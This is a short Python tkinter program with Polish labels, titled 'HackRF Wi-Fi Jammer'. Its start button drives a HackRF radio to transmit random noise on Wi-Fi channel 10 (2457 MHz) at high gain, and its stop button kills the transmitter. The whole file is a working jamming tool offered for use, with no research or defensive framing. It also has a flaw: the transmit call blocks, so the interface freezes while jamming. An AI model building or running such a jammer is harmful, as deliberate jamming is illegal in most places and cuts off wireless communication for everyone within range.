import tkinter as tk
import subprocess

def start_jamming():
    try:
        # Włączanie jammingu Wi-Fi na kanale 10
        command = "hackrf_transfer -t /dev/urandom -f 2457000000 -s 20000000 -x 47 -p 1"
        subprocess.run(command, shell=True, check=True)
        output_label.config(text="Jamowanie Wi-Fi rozpoczęte na kanale 10!")
    except subprocess.CalledProcessError as e:
        output_label.config(text=f"Błąd: {e}")

def stop_jamming():
    # Przerwanie wszystkich procesów HackRF
    subprocess.run("killall hackrf_transfer", shell=True)
    output_label.config(text="Jamowanie Wi-Fi zatrzymane.")

# Tworzenie GUI
root = tk.Tk()
root.title("HackRF Wi-Fi Jammer")

# Przyciski do sterowania
start_button = tk.Button(root, text="Rozpocznij Jamowanie", command=start_jamming)
start_button.pack()

stop_button = tk.Button(root, text="Zatrzymaj Jamowanie", command=stop_jamming)
stop_button.pack()

# Wyświetlanie statusu
output_label = tk.Label(root, text="")
output_label.pack()

# Uruchomienie aplikacji
root.mainloop()
